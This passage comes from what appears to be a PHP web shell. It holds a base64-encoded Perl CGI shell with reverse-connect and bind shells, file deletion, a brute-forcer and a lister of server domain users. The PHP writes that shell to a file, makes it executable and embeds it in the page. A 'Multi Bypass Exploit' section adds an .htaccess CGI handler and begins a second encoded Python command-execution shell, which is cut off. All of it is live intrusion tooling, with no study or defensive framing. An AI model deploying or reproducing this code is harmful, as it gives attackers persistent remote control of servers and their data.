yLiRQYXRoU2VwLiJiYWNrY29ubmVjdC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmFja2Nvbm5lY3QucGwgJENsaWVudEFkZHIgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX1lbHNlCgl7CgkJJERhdGE9ZGVjb2RlX2Jhc2U2NCgkYmluZHBlcmwpOwoJCWlmKC13ICIvdG1wIikKCQl7CgkJCSRGaWxlPSIvdG1wL2JpbmRwb3J0LnBsIjsJCgkJfWVsc2UKCQl7CgkJCSRGaWxlPSRDdXJyZW50RGlyLiRQYXRoU2VwLiJiaW5kcG9ydC5wbCI7CgkJfQoJCW9wZW4oRklMRSwgIj4kRmlsZSIpOwoJCXByaW50IEZJTEUgJERhdGE7CgkJY2xvc2UgRklMRTsKCQlzeXN0ZW0oInBlcmwgYmluZHBvcnQucGwgJENsaWVudFBvcnQiKTsKCQl1bmxpbmsoJEZpbGUpOwoJCWV4aXQgMDsKCX0KfQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgIEFycmF5IExpc3QgRGlyZWN0b3J5CiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJtRGlyKCQpIAp7CglteSAkZGlyID0gc2hpZnQ7CiAgICBpZihvcGVuZGlyKERJUiwkZGlyKSkKCXsKCQl3aGlsZSgkZmlsZSA9IHJlYWRkaXIoRElSKSkKCQl7CgkJCWlmKCgkZmlsZSBuZSAiLiIpICYmICgkZmlsZSBuZSAiLi4iKSkKCQkJewoJCQkJJGZpbGU9ICRkaXIuJFBhdGhTZXAuJGZpbGU7CgkJCQlpZigtZCAkZmlsZSkKCQkJCXsKCQkJCQkmUm1EaXIoJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXVubGluaygkZmlsZSk7CgkJCQl9CgkJCX0KCQl9CgkJY2xvc2VkaXIoRElSKTsKCX0KCWlmKCFybWRpcigkZGlyKSkKCXsKCQkKCX0KfQpzdWIgRmlsZU93bmVyKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJHVpZCwkZ2lkKSA9IChzdGF0KCRmaWxlKSlbNCw1XTsKCQlpZigkV2luTlQpCgkJewoJCQlyZXR1cm4gIj8/PyI7CgkJfQoJCWVsc2UKCQl7CgkJCSRuYW1lPWdldHB3dWlkKCR1aWQpOwoJCQkkZ3JvdXA9Z2V0Z3JnaWQoJGdpZCk7CgkJCXJldHVybiAkbmFtZS4iLyIuJGdyb3VwOwoJCX0KCX0KCXJldHVybiAiPz8/IjsKfQpzdWIgUGFyZW50Rm9sZGVyKCQpCnsKCW15ICRwYXRoID0gc2hpZnQ7CglteSAkQ29tbSA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkIC4uIi4kQ21kU2VwLiRDbWRQd2Q7CgljaG9wKCRwYXRoID0gYCRDb21tYCk7CglyZXR1cm4gJHBhdGg7Cn0Kc3ViIEZpbGVQZXJtcygkKQp7CglteSAkZmlsZSA9IHNoaWZ0OwoJbXkgJHVyID0gIi0iOwoJbXkgJHV3ID0gIi0iOwoJaWYoLWUgJGZpbGUpCgl7CgkJaWYoJFdpbk5UKQoJCXsKCQkJaWYoLXIgJGZpbGUpeyAkdXIgPSAiciI7IH0KCQkJaWYoLXcgJGZpbGUpeyAkdXcgPSAidyI7IH0KCQkJcmV0dXJuICR1ciAuICIgLyAiIC4gJHV3OwoJCX1lbHNlCgkJewoJCQkkbW9kZT0oc3RhdCgkZmlsZSkpWzJdOwoJCQkkcmVzdWx0ID0gc3ByaW50ZigiJTA0byIsICRtb2RlICYgMDc3NzcpOwoJCQlyZXR1cm4gJHJlc3VsdDsKCQl9Cgl9CglyZXR1cm4gIjAwMDAiOwp9CnN1YiBGaWxlTGFzdE1vZGlmaWVkKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZSAkZmlsZSkKCXsKCQkoJGxhKSA9IChzdGF0KCRmaWxlKSlbOV07CgkJKCRkLCRtLCR5LCRoLCRpKSA9IChsb2NhbHRpbWUoJGxhKSlbMyw0LDUsMiwxXTsKCQkkeSA9ICR5ICsgMTkwMDsKCQlAbW9udGggPSBxdy8xIDIgMyA0IDUgNiA3IDggOSAxMCAxMSAxMi87CgkJJGxtdGltZSA9IHNwcmludGYoIiUwMmQvJXMvJTRkICUwMmQ6JTAyZCIsJGQsJG1vbnRoWyRtXSwkeSwkaCwkaSk7CgkJcmV0dXJuICRsbXRpbWU7Cgl9CglyZXR1cm4gIj8/PyI7Cn0Kc3ViIEZpbGVTaXplKCQpCnsKCW15ICRmaWxlID0gc2hpZnQ7CglpZigtZiAkZmlsZSkKCXsKCQlyZXR1cm4gLXMgJGZpbGU7Cgl9CglyZXR1cm4gIjAiOwoKfQpzdWIgUGFyc2VGaWxlU2l6ZSgkKQp7CglteSAkc2l6ZSA9IHNoaWZ0OwoJaWYoJHNpemUgPD0gMTAyNCkKCXsKCQlyZXR1cm4gJHNpemUuICIgQiI7Cgl9CgllbHNlCgl7CgkJaWYoJHNpemUgPD0gMTAyNCoxMDI0KSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4wMmYiLCRzaXplIC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIEtCIjsKCQl9CgkJZWxzZSAKCQl7CgkJCSRzaXplID0gc3ByaW50ZigiJS4yZiIsJHNpemUgLyAxMDI0IC8gMTAyNCk7CgkJCXJldHVybiAkc2l6ZS4iIE1CIjsKCQl9Cgl9Cn0Kc3ViIHRyaW0oJCkKewoJbXkgJHN0cmluZyA9IHNoaWZ0OwoJJHN0cmluZyA9fiBzL15ccysvLzsKCSRzdHJpbmcgPX4gcy9ccyskLy87CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgQWRkU2xhc2hlcygkKQp7CglteSAkc3RyaW5nID0gc2hpZnQ7Cgkkc3RyaW5nPX4gcy9cXC9cXFxcL2c7CglyZXR1cm4gJHN0cmluZzsKfQpzdWIgTGlzdERpcgp7CglteSAkcGF0aCA9ICRDdXJyZW50RGlyLiRQYXRoU2VwOwoJJHBhdGg9fiBzL1xcXFwvXFwvZzsKCW15ICRyZXN1bHQgPSAiPGZvcm0gbmFtZT0nZicgYWN0aW9uPSckU2NyaXB0TG9jYXRpb24nPjxzcGFuIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+UGF0aDogWyAiLiZBZGRMaW5rRGlyKCJndWkiKS4iIF0gPC9zcGFuPjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSdkJyBzaXplPSc0MCcgdmFsdWU9JyRDdXJyZW50RGlyJyAvPjxpbnB1dCB0eXBlPSdoaWRkZW4nIG5hbWU9J2EnIHZhbHVlPSdndWknPjxpbnB1dCBjbGFzcz0nc3VibWl0JyB0eXBlPSdzdWJtaXQnIHZhbHVlPSdDaGFuZ2UnPjwvZm9ybT4iOwoJaWYoLWQgJHBhdGgpCgl7CgkJbXkgQGZuYW1lID0gKCk7CgkJbXkgQGRuYW1lID0gKCk7CgkJaWYob3BlbmRpcihESVIsJHBhdGgpKQoJCXsKCQkJd2hpbGUoJGZpbGUgPSByZWFkZGlyKERJUikpCgkJCXsKCQkJCSRmPSRwYXRoLiRmaWxlOwoJCQkJaWYoLWQgJGYpCgkJCQl7CgkJCQkJcHVzaChAZG5hbWUsJGZpbGUpOwoJCQkJfQoJCQkJZWxzZQoJCQkJewoJCQkJCXB1c2goQGZuYW1lLCRmaWxlKTsKCQkJCX0KCQkJfQoJCQljbG9zZWRpcihESVIpOwoJCX0KCQlAZm5hbWUgPSBzb3J0IHsgbGMoJGEpIGNtcCBsYygkYikgfSBAZm5hbWU7CgkJQGRuYW1lID0gc29ydCB7IGxjKCRhKSBjbXAgbGMoJGIpIH0gQGRuYW1lOwoJCSRyZXN1bHQgLj0gIjxkaXY+PHRhYmxlIHdpZHRoPSc5MCUnIGNsYXNzPSdsaXN0ZGlyJz4KCgkJPHRyIHN0eWxlPSdiYWNrZ3JvdW5kLWNvbG9yOiAjM2UzZTNlJz48dGg+RmlsZSBOYW1lPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjEwMHB4Oyc+RmlsZSBTaXplPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+T3duZXI8L3RoPgoJCTx0aCBzdHlsZT0nd2lkdGg6MTAwcHg7Jz5QZXJtaXNzaW9uPC90aD4KCQk8dGggc3R5bGU9J3dpZHRoOjE1MHB4Oyc+TGFzdCBNb2RpZmllZDwvdGg+CgkJPHRoIHN0eWxlPSd3aWR0aDoyNjBweDsnPkFjdGlvbjwvdGg+PC90cj4iOwoJCW15ICRzdHlsZT0ibGluZSI7CgkJbXkgJGk9MDsKCQlmb3JlYWNoIG15ICRkIChAZG5hbWUpCgkJewoJCQkkc3R5bGU9ICgkc3R5bGUgZXEgImxpbmUiKSA/ICJub3RsaW5lIjogImxpbmUiOwoJCQkkZCA9ICZ0cmltKCRkKTsKCQkJJGRpcm5hbWU9JGQ7CgkJCWlmKCRkIGVxICIuLiIpIAoJCQl7CgkJCQkkZCA9ICZQYXJlbnRGb2xkZXIoJHBhdGgpOwoJCQl9CgkJCWVsc2lmKCRkIGVxICIuIikgCgkJCXsKCQkJCSRkID0gJHBhdGg7CgkJCX0KCQkJZWxzZSAKCQkJewoJCQkJJGQgPSAkcGF0aC4kZDsKCQkJfQoJCQkkcmVzdWx0IC49ICI8dHIgY2xhc3M9JyRzdHlsZSc+CgoJCQk8dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7IGZvbnQtd2VpZ2h0OiBib2xkOyc+PGEgIGhyZWY9Jz9hPWd1aSZkPSIuJGQuIic+WyAiLiRkaXJuYW1lLiIgXTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZD5ESVI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7Jz4iLiZGaWxlT3duZXIoJGQpLiI8L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjx0ZCBpZD0nRmlsZVBlcm1zXyRpJyBzdHlsZT0ndGV4dC1hbGlnbjpjZW50ZXI7JyBvbmRibGNsaWNrPVwicm1fY2htb2RfZm9ybSh0aGlzLCIuJGkuIiwnIi4mRmlsZVBlcm1zKCRkKS4iJywnIi4kZGlybmFtZS4iJylcIiA+PHNwYW4gb25jbGljaz1cImNobW9kX2Zvcm0oIi4kaS4iLCciLiRkaXJuYW1lLiInKVwiID4iLiZGaWxlUGVybXMoJGQpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZCkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZGlybmFtZScsJyIuJkFkZFNsYXNoZXMoJkFkZFNsYXNoZXMoJGQpKS4iJylcIj5SZW5hbWU8L2E+ICB8IDxhIG9uY2xpY2s9XCJpZighY29uZmlybSgnUmVtb3ZlIGRpcjogJGRpcm5hbWUgPycpKSB7IHJldHVybiBmYWxzZTt9XCIgaHJlZj0nP2E9Z3VpJmQ9JHBhdGgmcmVtb3ZlPSRkaXJuYW1lJz5SZW1vdmU8L2E+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8L3RyPiI7CgkJCSRpKys7CgkJfQoJCWZvcmVhY2ggbXkgJGYgKEBmbmFtZSkKCQl7CgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlPSRmOwoJCQkkZiA9ICRwYXRoLiRmOwoJCQkkdmlldyA9ICI/ZGlyPSIuJHBhdGguIiZ2aWV3PSIuJGY7CgkJCSRyZXN1bHQgLj0gIjx0ciBjbGFzcz0nJHN0eWxlJz48dGQgaWQ9J0ZpbGVfJGknIHN0eWxlPSdmb250OiAxMXB0IFZlcmRhbmE7Jz48YSBocmVmPSc/YT1jb21tYW5kJmQ9Ii4kcGF0aC4iJmM9ZWRpdCUyMCIuJGZpbGUuIic+Ii4kZmlsZS4iPC9hPjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkPiIuJlBhcnNlRmlsZVNpemUoJkZpbGVTaXplKCRmKSkuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPiIuJkZpbGVPd25lcigkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIGlkPSdGaWxlUGVybXNfJGknIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnIG9uZGJsY2xpY2s9XCJybV9jaG1vZF9mb3JtKHRoaXMsIi4kaS4iLCciLiZGaWxlUGVybXMoJGYpLiInLCciLiRmaWxlLiInKVwiID48c3BhbiBvbmNsaWNrPVwiY2htb2RfZm9ybSgkaSwnJGZpbGUnKVwiID4iLiZGaWxlUGVybXMoJGYpLiI8L3NwYW4+PC90ZD4iOwoJCQkkcmVzdWx0IC49ICI8dGQgc3R5bGU9J3RleHQtYWxpZ246Y2VudGVyOyc+Ii4mRmlsZUxhc3RNb2RpZmllZCgkZikuIjwvdGQ+IjsKCQkJJHJlc3VsdCAuPSAiPHRkIHN0eWxlPSd0ZXh0LWFsaWduOmNlbnRlcjsnPjxhIGhyZWY9Jz9hPWNvbW1hbmQmZD0iLiRwYXRoLiImYz1lZGl0JTIwIi4kZmlsZS4iJz5FZGl0PC9hPiB8IDxhIGhyZWY9J2phdmFzY3JpcHQ6cmV0dXJuIGZhbHNlOycgb25jbGljaz1cInJlbmFtZV9mb3JtKCRpLCckZmlsZScsJ2YnKVwiPlJlbmFtZTwvYT4gfCA8YSBocmVmPSc/YT1kb3dubG9hZCZvPWdvJmY9Ii4kZi4iJz5Eb3dubG9hZDwvYT4gfCA8YSBvbmNsaWNrPVwiaWYoIWNvbmZpcm0oJ1JlbW92ZSBmaWxlOiAkZmlsZSA/JykpIHsgcmV0dXJuIGZhbHNlO31cIiBocmVmPSc/YT1ndWkmZD0kcGF0aCZyZW1vdmU9JGZpbGUnPlJlbW92ZTwvYT48L3RkPiI7CgkJCSRyZXN1bHQgLj0gIjwvdHI+IjsKCQkJJGkrKzsKCQl9CgkJJHJlc3VsdCAuPSAiPC90YWJsZT48L2Rpdj4iOwoJfQoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFRyeSB0byBWaWV3IExpc3QgVXNlcgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBWaWV3RG9tYWluVXNlcgp7CglvcGVuIChkb21haW5zLCAnL2V0Yy9uYW1lZC5jb25mJykgb3IgJGVycj0xOwoJbXkgQGNuenMgPSA8ZG9tYWlucz47CgljbG9zZSBkMG1haW5zOwoJbXkgJHN0eWxlPSJsaW5lIjsKCW15ICRyZXN1bHQ9IjxoNT48Zm9udCBzdHlsZT0nZm9udDogMTVwdCBWZXJkYW5hO2NvbG9yOiAjZmY5OTAwOyc+SG9hbmcgU2EgLSBUcnVvbmcgU2E8L2ZvbnQ+PC9oNT4iOwoJaWYgKCRlcnIpCgl7CgkJJHJlc3VsdCAuPSAgKCc8cD5DMHVsZG5cJ3QgQnlwYXNzIGl0ICwgU29ycnk8L3A+Jyk7CgkJcmV0dXJuICRyZXN1bHQ7Cgl9ZWxzZQoJewoJCSRyZXN1bHQgLj0gJzx0YWJsZT48dHI+PHRoPkRvbWFpbnM8L3RoPiA8dGg+VXNlcjwvdGg+PC90cj4nOwoJfQoJZm9yZWFjaCBteSAkb25lIChAY256cykKCXsKCQlpZigkb25lID1+IG0vLio/em9uZSAiKC4qPykiIHsvKQoJCXsJCgkJCSRzdHlsZT0gKCRzdHlsZSBlcSAibGluZSIpID8gIm5vdGxpbmUiOiAibGluZSI7CgkJCSRmaWxlbmFtZT0gIi9ldGMvdmFsaWFzZXMvIi4kb25lOwoJCQkkb3duZXIgPSBnZXRwd3VpZCgoc3RhdCgkZmlsZW5hbWUpKVs0XSk7CgkJCSRyZXN1bHQgLj0gJzx0ciBjbGFzcz0iJHN0eWxlIiB3aWR0aD01MCU+PHRkPicuJG9uZS4nIDwvdGQ+PHRkPiAnLiRvd25lci4nPC90ZD48L3RyPic7CgkJfQoJfQoJJHJlc3VsdCAuPSAnPC90YWJsZT4nOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFZpZXcgTG9nCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFZpZXdMb2cKewoJaWYoJFdpbk5UKQoJewoJCXJldHVybiAiPGgyPjxmb250IHN0eWxlPSdmb250OiAyMHB0IFZlcmRhbmE7Y29sb3I6ICNmZjk5MDA7Jz5Eb24ndCBydW4gb24gV2luZG93czwvZm9udD48L2gyPiI7Cgl9CglteSAkcmVzdWx0PSI8dGFibGU+PHRyPjx0aD5QYXRoIExvZzwvdGg+PHRoPlN1Ym1pdDwvdGg+PC90cj4iOwoJbXkgQHBhdGhsb2c9KAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvZXJyb3JfbG9nJywKCQkJCScvdmFyL2xvZy9odHRwZC9lcnJvcl9sb2cnLAoJCQkJJy91c3IvbG9jYWwvYXBhY2hlL2xvZ3MvYWNjZXNzX2xvZycKCQkJCSk7CglteSAkaT0wOwoJbXkgJHBlcm1zOwoJbXkgJHNsOwoJZm9yZWFjaCBteSAkbG9nIChAcGF0aGxvZykKCXsKCQlpZigtdyAkbG9nKQoJCXsKCQkJJHBlcm1zPSJPSyI7CgkJfWVsc2UKCQl7CgkJCWNob3AoJHNsID0gYGxuIC1zICRsb2cgZXJyb3JfbG9nXyRpYCk7CgkJCWlmKCZ0cmltKCRscykgZXEgIiIpCgkJCXsKCQkJCWlmKC1yICRscykKCQkJCXsKCQkJCQkkcGVybXM9Ik9LIjsKCQkJCQkkbG9nPSJlcnJvcl9sb2dfIi4kaTsKCQkJCX0KCQkJfWVsc2UKCQkJewoJCQkJJHBlcm1zPSI8Zm9udCBzdHlsZT0nY29sb3I6IHJlZDsnPkNhbmNlbDxmb250PiI7CgkJCX0KCQl9CgkJJHJlc3VsdCAuPTw8RU5EOwoJCTx0cj4KCgkJCTxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPgoJCQk8dGQ+PGlucHV0IHR5cGU9InRleHQiIG9ua2V5dXA9ImRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdsb2dfJGknKS52YWx1ZT0nbGVzcyAnICsgdGhpcy52YWx1ZTsiIHZhbHVlPSIkbG9nIiBzaXplPSc1MCcvPjwvdGQ+CgkJCTx0ZD48aW5wdXQgY2xhc3M9InN1Ym1pdCIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iVHJ5IiAvPjwvdGQ+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIGlkPSJsb2dfJGkiIG5hbWU9ImMiIHZhbHVlPSJsZXNzICRsb2ciLz4KCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iYSIgdmFsdWU9ImNvbW1hbmQiIC8+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImQiIHZhbHVlPSIkQ3VycmVudERpciIgLz4KCQkJPC9mb3JtPgoJCQk8dGQ+JHBlcm1zPC90ZD4KCgkJPC90cj4KRU5ECgkJJGkrKzsKCX0KCSRyZXN1bHQgLj0iPC90YWJsZT4iOwoJcmV0dXJuICRyZXN1bHQ7Cn0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIE1haW4gUHJvZ3JhbSAtIEV4ZWN1dGlvbiBTdGFydHMgSGVyZQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiZSZWFkUGFyc2U7CiZHZXRDb29raWVzOwoKJFNjcmlwdExvY2F0aW9uID0gJEVOVnsnU0NSSVBUX05BTUUnfTsKJFNlcnZlck5hbWUgPSAkRU5WeydTRVJWRVJfTkFNRSd9OwokTG9naW5QYXNzd29yZCA9ICRpbnsncCd9OwokUnVuQ29tbWFuZCA9ICRpbnsnYyd9OwokVHJhbnNmZXJGaWxlID0gJGlueydmJ307CiRPcHRpb25zID0gJGlueydvJ307CiRBY3Rpb24gPSAkaW57J2EnfTsKCiRBY3Rpb24gPSAiY29tbWFuZCIgaWYoJEFjdGlvbiBlcSAiIik7ICMgbm8gYWN0aW9uIHNwZWNpZmllZCwgdXNlIGRlZmF1bHQKCiMgZ2V0IHRoZSBkaXJlY3RvcnkgaW4gd2hpY2ggdGhlIGNvbW1hbmRzIHdpbGwgYmUgZXhlY3V0ZWQKJEN1cnJlbnREaXIgPSAmdHJpbSgkaW57J2QnfSk7CiMgbWFjIGRpbmggeHVhdCB0aG9uZyB0aW4gbmV1IGtvIGNvIGxlbmggbmFvIQokUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSIgaWYoJFJ1bkNvbW1hbmQgZXEgIiIpOwpjaG9wKCRDdXJyZW50RGlyID0gYCRDbWRQd2RgKSBpZigkQ3VycmVudERpciBlcSAiIik7CgokTG9nZ2VkSW4gPSAkQ29va2llc3snU0FWRURQV0QnfSBlcSAkUGFzc3dvcmQ7CgppZigkQWN0aW9uIGVxICJsb2dpbiIgfHwgISRMb2dnZWRJbikgCQkjIHVzZXIgbmVlZHMvaGFzIHRvIGxvZ2luCnsKCSZQZXJmb3JtTG9naW47Cn1lbHNpZigkQWN0aW9uIGVxICJndWkiKSAjIEdVSSBkaXJlY3RvcnkKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCEkV2luTlQpCgl7CgkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCWlmKCEoJGNobW9kIGVxIDApKQoJCXsKCQkJJGNobW9kPWludCgkaW57J2NobW9kJ30pOwoJCQkkZmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kVHJhbnNmZXJGaWxlOwoJCQljaG9wKCRyZXN1bHQ9IGBjaG1vZCAkY2htb2QgIiRmaWxlImApOwoJCQlpZigmdHJpbSgkcmVzdWx0KSBlcSAiIikKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CgkJfQoJfQoJJHJlbmFtZT0kaW57J3JlbmFtZSd9OwoJaWYoISRyZW5hbWUgZXEgIiIpCgl7CgkJaWYocmVuYW1lKCRUcmFuc2ZlckZpbGUsJHJlbmFtZSkpCgkJewoJCQlwcmludCAiPHJ1bj4gRG9uZSEgPC9ydW4+PGJyPiI7CgkJfWVsc2UKCQl7CgkJCXByaW50ICI8cnVuPiBTb3JyeSEgWW91IGRvbnQgaGF2ZSBwZXJtaXNzaW9ucyEgPC9ydW4+PGJyPiI7CgkJfQoJfQoJJHJlbW92ZT0kaW57J3JlbW92ZSd9OwoJaWYoJHJlbW92ZSBuZSAiIikKCXsKCQkkcm0gPSAkQ3VycmVudERpci4kUGF0aFNlcC4kcmVtb3ZlOwoJCWlmKC1kICRybSkKCQl7CgkJCSZSbURpcigkcm0pOwoJCX1lbHNlCgkJewoJCQlpZih1bmxpbmsoJHJtKSkKCQkJewoJCQkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJCQl9ZWxzZQoJCQl7CgkJCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJCQl9CQkJCgkJfQoJfQoJcHJpbnQgJkxpc3REaXI7Cgp9CmVsc2lmKCRBY3Rpb24gZXEgImNvbW1hbmQiKQkJCQkgCSMgdXNlciB3YW50cyB0byBydW4gYSBjb21tYW5kCnsKCSZQcmludFBhZ2VIZWFkZXIoImMiKTsKCXByaW50ICZFeGVjdXRlQ29tbWFuZDsKfQplbHNpZigkQWN0aW9uIGVxICJzYXZlIikJCQkJIAkjIHVzZXIgd2FudHMgdG8gc2F2ZSBhIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCWlmKCZTYXZlRmlsZSgkaW57J2RhdGEnfSwkaW57J2ZpbGUnfSkpCgl7CgkJcHJpbnQgIjxydW4+IERvbmUhIDwvcnVuPjxicj4iOwoJfWVsc2UKCXsKCQlwcmludCAiPHJ1bj4gU29ycnkhIFlvdSBkb250IGhhdmUgcGVybWlzc2lvbnMhIDwvcnVuPjxicj4iOwoJfQoJcHJpbnQgJkxpc3REaXI7Cn0KZWxzaWYoJEFjdGlvbiBlcSAidXBsb2FkIikgCQkJCQkjIHVzZXIgd2FudHMgdG8gdXBsb2FkIGEgZmlsZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoKCXByaW50ICZVcGxvYWRGaWxlOwp9CmVsc2lmKCRBY3Rpb24gZXEgImJhY2tiaW5kIikgCQkJCSMgdXNlciB3YW50cyB0byBiYWNrIGNvbm5lY3Qgb3IgYmluZCBwb3J0CnsKCSZQcmludFBhZ2VIZWFkZXIoImNsaWVudHBvcnQiKTsKCXByaW50ICZCYWNrQmluZDsKfQplbHNpZigkQWN0aW9uIGVxICJicnV0ZWZvcmNlciIpIAkJCSMgdXNlciB3YW50cyB0byBicnV0ZSBmb3JjZQp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJkJydXRlRm9yY2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAiZG93bmxvYWQiKSAJCQkJIyB1c2VyIHdhbnRzIHRvIGRvd25sb2FkIGEgZmlsZQp7CglwcmludCAmRG93bmxvYWRGaWxlOwp9ZWxzaWYoJEFjdGlvbiBlcSAiY2hlY2tsb2ciKSAJCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbG9nIGZpbGUKewoJJlByaW50UGFnZUhlYWRlcjsKCXByaW50ICZWaWV3TG9nOwoKfWVsc2lmKCRBY3Rpb24gZXEgImRvbWFpbnN1c2VyIikgCQkJIyB1c2VyIHdhbnRzIHRvIHZpZXcgbGlzdCB1c2VyL2RvbWFpbgp7CgkmUHJpbnRQYWdlSGVhZGVyOwoJcHJpbnQgJlZpZXdEb21haW5Vc2VyOwp9ZWxzaWYoJEFjdGlvbiBlcSAibG9nb3V0IikgCQkJCSMgdXNlciB3YW50cyB0byBsb2dvdXQKewoJJlBlcmZvcm1Mb2dvdXQ7Cn0KJlByaW50UGFnZUZvb3Rlcjs=';
$file = fopen("cgi2012.izo" ,"w+");
$write = fwrite ($file ,base64_decode($cgi2012));
fclose($file);
    chmod("cgi2012.izo",0755);
   echo " <iframe src=cgi2012/cgi2012.izo width=96% height=76% frameborder=0></iframe></div>";
}
#==================[ Multi Bypass Exploit ]==================#

if(isset($_POST['python']))
{
echo "<center/><br/><b>+--==[ python  Bypass Exploit ]==--+</b><br><br>";
    mkdir('python', 0755);
    chdir('python');
        $kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
        $metin = "AddHandler cgi-script .izo";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
